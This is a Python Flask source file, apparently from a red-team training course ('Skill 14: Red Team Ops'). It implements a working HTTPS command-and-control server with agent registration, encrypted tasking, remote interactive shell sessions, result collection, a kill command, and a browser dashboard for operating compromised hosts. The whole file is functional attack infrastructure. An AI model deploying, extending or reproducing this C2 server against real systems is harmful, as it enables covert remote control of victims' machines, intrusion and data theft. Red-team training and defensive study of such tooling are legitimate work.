#!/usr/bin/env python3
"""
C2 Server - HTTPS command & control
Skill 14: Red Team Ops
"""
import base64
import hashlib
import hmac
import json
import os
import ssl
import threading
import uuid
from datetime import datetime, timezone
from flask import Flask, request, jsonify, Response

app = Flask(__name__)

AGENTS = {}
TASKS = {}
RESULTS = {}
TASK_COUNTER = 0
LOCK = threading.Lock()
RAW_KEY = os.urandom(32)
KEY_B64 = base64.b64encode(RAW_KEY).decode()

def _expand(secret, iv, n):
    k = hmac.new(secret, iv, hashlib.sha256).digest()
    out = b""
    for i in range(n):
        out += hmac.new(k, str(i).encode(), hashlib.sha256).digest()
    return out[:n]

def encrypt(plain, key=RAW_KEY):
    iv = os.urandom(16)
    p = plain.encode() if isinstance(plain, str) else plain
    ct = bytes(a ^ b for a, b in zip(p, _expand(key, iv, len(p))))
    tag = hmac.new(key, iv + ct, hashlib.sha256).digest()[:8]
    return base64.b64encode(iv + ct + tag).decode()

def decrypt(data, key=RAW_KEY):
    raw = base64.b64decode(data.encode())
    iv, ct, tag = raw[:16], raw[16:-8], raw[-8:]
    expected = hmac.new(key, iv + ct, hashlib.sha256).digest()[:8]
    if not hmac.compare_digest(tag, expected):
        raise ValueError("bad tag")
    p = bytes(a ^ b for a, b in zip(ct, _expand(key, iv, len(ct))))
    return p.decode()

def gen_id():
    return str(uuid.uuid4())[:8]

@app.route('/api/key', methods=['GET'])
def get_key():
    return jsonify({"key": KEY_B64})

@app.route('/api/login', methods=['POST'])
def agent_login():
    data = request.get_json(force=True)
    raw = decrypt(data.get("cipher", ""))
    info = json.loads(raw)
    aid = gen_id()
    with LOCK:
        AGENTS[aid] = {
            "id": aid,
            "hostname": info.get("hostname", "?"),
            "user": info.get("user", "?"),
            "os": info.get("os", "?"),
            "ip": request.remote_addr,
            "first_seen": datetime.now(timezone.utc).isoformat(),
            "last_seen": datetime.now(timezone.utc).isoformat(),
            "alive": True
        }
        TASKS[aid] = []
        RESULTS[aid] = []
    return jsonify({"agent_id": aid, "interval": 5})

@app.route('/api/agents', methods=['GET'])
def list_agents():
    now = datetime.now(timezone.utc)
    with LOCK:
        out = []
        for a in AGENTS.values():
            try:
                last = datetime.fromisoformat(a["last_seen"])
                if last.tzinfo is None:
                    last = last.replace(tzinfo=timezone.utc)
                a["alive"] = (now - last).total_seconds() < 30
            except Exception:
                a["alive"] = False
            out.append(a)
        return jsonify({"agents": out})

@app.route('/api/tasks/<aid>', methods=['GET', 'POST'])
def handle_tasks(aid):
    if request.method == 'GET':
        with LOCK:
            if aid in AGENTS:
                AGENTS[aid]["last_seen"] = datetime.now(timezone.utc).isoformat()
            tasks = TASKS.get(aid, [])
            out = tasks[:]
            TASKS[aid] = []
        return jsonify({"tasks": out, "interval": 5, "key": KEY_B64, "known": aid in AGENTS})
    else:
        data = request.get_json(force=True)
        raw = decrypt(data.get("cipher", ""))
        result = json.loads(raw)
        with LOCK:
            rlist = RESULTS.get(aid, [])
            rlist.append(result)
            RESULTS[aid] = rlist
        return jsonify({"ok": True, "key": KEY_B64})

@app.route('/api/task', methods=['POST'])
def issue_task():
    data = request.get_json(force=True)
    aid = data.get("agent_id", "")
    task_type = data.get("type", "shell")
    payload = data.get("payload", "")
    with LOCK:
        tid = len(TASKS.get(aid, [])) + 1
        task = {"id": tid, "type": task_type, "payload": payload, "issued": datetime.now(timezone.utc).isoformat()}
        if aid in TASKS:
            TASKS[aid].append(task)
        else:
            return jsonify({"error": "unknown agent"}), 404
    return jsonify({"task_id": tid})

@app.route('/api/results/<aid>', methods=['GET'])
def get_results(aid):
    with LOCK:
        r = RESULTS.get(aid, [])
    return jsonify({"results": r})

DASHBOARD = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>C2</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:"JetBrains Mono","Fira Code","Cascadia Code",monospace;background:#0d1117;color:#c9d1d9;height:100vh;display:flex;flex-direction:column}
#top{flex-shrink:0;padding:8px 16px;border-bottom:1px solid #30363d;display:flex;align-items:center;gap:16px}
#top h1{color:#58a6ff;font-size:15px}
#top code{color:#484f58;font-size:10px}
table{width:100%;border-collapse:collapse;flex-shrink:0;font-size:11px}
th,td{padding:4px 10px;border-bottom:1px solid #21262d;cursor:pointer}
th{color:#8b949e;font-size:9px;text-transform:uppercase;background:#0d1117}
tr:hover{background:#161b22}
.id{color:#58a6ff}.host{color:#7ee787}.user{color:#d2a8ff}.os{color:#79c0ff}.ip{color:#ffa657}.time{color:#484f58;font-size:10px}
.selected{background:#1f2937!important;border-left:2px solid #58a6ff}
.dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:5px}
.on{background:#238636}.off{background:#da3633}
#term{flex:1;display:flex;flex-direction:column;min-height:0}
#term-out{flex:1;overflow-y:auto;padding:4px 16px;font-size:13px;line-height:1.4;background:#010409;white-space:pre-wrap}
#term-in{display:flex;align-items:center;padding:6px 16px;background:#0d1117;border-top:1px solid #30363d}
#prompt{color:#7ee787;font-size:13px;white-space:pre;flex-shrink:0}
#input{background:0 0;border:none;color:#c9d1d9;font:inherit;font-size:13px;outline:none;flex:1;caret-color:#58a6ff}
#input::placeholder{color:#30363d}
#bar{display:flex;align-items:center;gap:8px;padding:3px 16px;background:#161b22;border-bottom:1px solid #30363d;font-size:11px;flex-shrink:0}
#bar .l{color:#484f58}#bar .v{color:#58a6ff}#bar .h{color:#8b949e}
#bar .k{padding:1px 6px;background:0 0;border:1px solid #da3633;color:#da3633;border-radius:3px;cursor:pointer;font:inherit;font-size:9px;margin-left:auto}
#bar .k:hover{background:#da3633;color:#fff}
#no{flex:1;display:flex;align-items:center;justify-content:center;color:#30363d;font-size:13px}
.hidden{display:none!important}
::-webkit-scrollbar{width:5px}
::-webkit-scrollbar-track{background:#0d1117}
::-webkit-scrollbar-thumb{background:#30363d;border-radius:2px}
.t-raw{}
</style>
</head>
<body>
<div id="top"><h1>&#9889; C2</h1><code id="kd"></code></div>
<table><thead><tr><th></th><th>ID</th><th>Host</th><th>User</th><th>OS</th><th>IP</th><th>Seen</th></tr></thead><tbody id="ab"></tbody></table>
<div id="bar" class="hidden"><span class="l">Agent</span><span class="v" id="si"></span><span class="h">/</span><span class="v" id="sh"></span><span class="h">@</span><span class="v" id="su"></span><button class="k" onclick="ka()">KILL</button></div>
<div id="no">select agent</div>
<div id="term" class="hidden"><div id="term-out"></div><div id="term-in"><span id="prompt"></span><input id="input" placeholder="command" autofocus spellcheck="false" autocomplete="off"></div></div>
<script>
let A={},S=null,RC=0,SO=null;
async function ap(u,o){let r=await fetch(u,o);return r.json()}
async function la(){
  let d=await ap('/api/agents');A={};
  let tb=document.getElementById('ab');tb.innerHTML='';
  for(let a of d.agents||[]){
    A[a.id]=a;let tr=document.createElement('tr');
    if(a.id===S)tr.className='selected';
    tr.innerHTML='<td><span class="dot '+(a.alive?'on':'off')+'"></span></td><td class="id">'+a.id+'</td><td class="host">'+a.hostname+'</td><td class="user">'+a.user+'</td><td class="os">'+a.os+'</td><td class="ip">'+a.ip+'</td><td class="time">'+(a.last_seen||'').slice(0,19)+'</td>';
    tr.onclick=()=>sel(a.id);tb.appendChild(tr);
  }
}
async function sel(id){
  S=id;let a=A[id];if(!a)return;
  document.getElementById('si').textContent=a.id;
  document.getElementById('sh').textContent=a.hostname;
  document.getElementById('su').textContent=a.user;
  document.getElementById('no').classList.add('hidden');
  document.getElementById('bar').classList.remove('hidden');
  document.getElementById('term').classList.remove('hidden');
  document.getElementById('term-out').textContent='';
  document.getElementById('prompt').textContent=a.user+'@'+a.hostname+' $ ';
  document.getElementById('input').value='';document.getElementById('input').focus();
  la();RC=0;SO=null;
  // start PTY shell on agent
  ap('/api/task',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent_id:S,type:'shell_start',payload:''})});
  // start output poller
  if(SO)clearInterval(SO);
  SO=setInterval(async()=>{
    let d=await ap('/api/results/'+S);
    let r=d.results||[];
    for(let i=RC;i<r.length;i++){
      if(r[i].type=='shell_output'){
        let o=r[i].output||{};
        let t=document.getElementById('term-out');
        if(o.stdout)t.textContent+=o.stdout.replace(/\u001b\[[0-9;?]*[a-zA-Z]/g,'').replace(/\u001b\][^\u0007]*\u0007/g,'').replace(/\r/g,'');
        t.scrollTop=t.scrollHeight;
      }
    }
    RC=r.length;
  },500);
}
document.getElementById('input').addEventListener('keydown',async function(e){
  if(e.key!=='Enter'||!S)return;
  let cmd=this.value;this.value='';
  if(!cmd)return;
  let t=document.getElementById('term-out');
  t.textContent+='$ '+cmd+'\n';
  t.scrollTop=t.scrollHeight;
  this.disabled=true;
  await ap('/api/task',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent_id:S,type:'shell_input',payload:cmd+'\n'})});
  this.disabled=false;this.focus();
});
async function ka(){
  if(!S||!confirm('KILL agent '+S+'?'))return;
  ap('/api/task',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent_id:S,type:'exit',payload:''})});
  let t=document.getElementById('term-out');
  t.textContent+='\n[!] kill sent\n';
  t.scrollTop=t.scrollHeight;
}
(async()=>{let k=await ap('/api/key');document.getElementById('kd').textContent=k.key;la();setInterval(la,3000)})();
</script>
</body>
</html>"""

@app.route('/')
def dashboard():
    return Response(DASHBOARD, mimetype='text/html')

if __name__ == '__main__':
    import sys
    use_tls = "--no-tls" not in sys.argv
    proto = "https" if use_tls else "http"
    print(f"[C2] Server key: {KEY_B64}")
    print(f"[C2] Listening on {proto}://0.0.0.0:8443")
    if use_tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain('cert.pem', 'key.pem')
        app.run(host='0.0.0.0', port=8443, ssl_context=ctx, debug=False)
    else:
        app.run(host='0.0.0.0', port=8443, debug=False)
